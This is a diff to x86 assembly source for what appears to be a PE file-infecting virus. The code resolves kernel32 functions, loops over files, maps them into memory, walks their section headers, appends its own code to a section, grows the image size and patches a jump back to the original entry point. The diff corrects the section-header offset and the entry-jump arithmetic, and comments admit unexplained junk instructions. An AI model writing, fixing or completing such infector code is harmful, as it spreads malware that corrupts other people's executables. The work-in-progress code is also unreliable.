@@ -243,7 +243,20 @@ addloc macro	dest, src
 
 	   endm
 
+;; 2 bytes version
+addwloc macro	dest, src
 
+	push edi
+
+	xor edi, edi
+
+	mov di, dest
+	add di, src
+	mov dest, di
+
+	pop edi
+
+		endm
 
 extractKernel32PEHeader proc delta:dword
 
@@ -410,6 +423,12 @@ filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword, code
 	local prcMapViewOfFile:dword
 	local prcUnmapViewOfFile:dword
 	local prcCloseHandle:dword
+	local sectionHeaderOffset:dword
+
+	local s1:dword
+	local s2:word
+	local s3:dword
+	local s4:dword
 
 	;jmp filesLoopInit
 	call filesLoopInit
@@ -532,7 +551,20 @@ fileMainLoop:
 ; --------------------------------------------------------------------------------------------------
 
 	; jump the PE headers (IMAGE_NT_HEADERS)
-	add eax, sizeof IMAGE_NT_HEADERS
+
+
+	movloc sectionHeaderOffset, sizeof dword ;[eax].Signature
+
+	push edi
+	xor edi, edi
+	mov di, [eax].FileHeader.SizeOfOptionalHeader
+	add sectionHeaderOffset, edi
+	pop edi
+	
+	addloc sectionHeaderOffset, sizeof IMAGE_FILE_HEADER ; [eax].FileHeader
+
+	;;add eax, sizeof IMAGE_NT_HEADERS
+	add eax, sectionHeaderOffset
 
 	; ebx == PE_HEADER, IMAGE_NT_HEADERS
 	; eax == IMAGE_SECTION_HEADERS
@@ -588,7 +620,7 @@ fileMainLoop:
 	mov edx, fileView ; from the beginning of the mapped file
 	add edx, [edi].PointerToRawData ; go to the section address
 	add edx, [edi].SizeOfRawData ; go to the end of the section
-	dec edx ; don't go to far
+	dec edx ; don't go too far
 
 	; get to the right place
 
@@ -640,7 +672,8 @@ __getcur0:
 
 
 	sub eax, 6 ; go back 6 bytes, which is ret and 5 nops
-	sub jumpOffset, 6
+	;; should be 6 for junks instructions appearing for some reason
+	sub jumpOffset, 1
 	mov edx, originalEntryPoint
 	sub edx, jumpOffset
 	mov jumpOffset, edx
@@ -658,7 +691,8 @@ __getcur0:
 	add [edi].SizeOfRawData, eax
 
 	mov eax, codeSize
-	add [ebx].OptionalHeader.SizeOfImage, eax
+	;add [ebx].OptionalHeader.SizeOfImage, eax
+	add [ebx].OptionalHeader.SizeOfImage, 01000h
 	add [edi].Misc.VirtualSize, eax
 
 	; END SCRAT
